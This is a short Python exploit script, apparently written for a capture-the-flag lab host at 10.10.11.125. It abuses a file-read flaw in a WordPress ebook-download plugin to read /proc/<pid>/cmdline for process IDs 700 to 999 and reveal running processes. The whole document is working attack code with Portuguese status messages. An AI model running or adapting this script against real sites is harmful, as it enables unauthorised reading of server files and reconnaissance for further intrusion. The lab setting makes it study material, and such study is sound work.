#!/bin/python3


import signal
import requests
import sys

from pwn import *

url= "http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/"

for pid in range(700,1000):
    
    print("testando" + str(pid))
    cont = (requests.get(url + str(pid) + "/cmdline")).content
    if(len(cont) > 125):
        print(str(pid) + "encontrado")
    print(cont)
print(cont)